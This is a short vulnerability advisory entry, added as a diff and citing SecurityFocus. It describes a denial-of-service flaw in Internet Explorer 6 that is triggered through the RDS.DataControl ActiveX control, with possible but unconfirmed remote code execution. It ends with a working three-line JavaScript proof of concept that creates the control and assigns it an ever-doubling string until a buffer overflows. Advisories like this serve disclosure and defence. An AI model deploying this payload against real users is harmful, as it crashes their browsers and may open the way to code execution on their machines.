@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/18900/info
+
+Microsoft Internet Explorer 6 is reportedly prone to a denial-of-service vulnerability because the application fails to perform boundary checks before copying user-supplied data into sensitive process buffers.
+
+This issue is triggered when an attacker convinces a victim to activate a malicious ActiveX control object.
+
+Remote attackers may exploit this issue to crash Internet Explorer 6, effectively denying service to legitimate users.
+
+A stack-based heap overflow may be possible; as a result, remote code could run in the context of the user running the affected application. This has not been confirmed.
+
+var a = new ActiveXObject(&#039;RDS.DataControl&#039;);
+var b = "X";
+while (b.length < (1024*256)) a.URL = (b+=b);
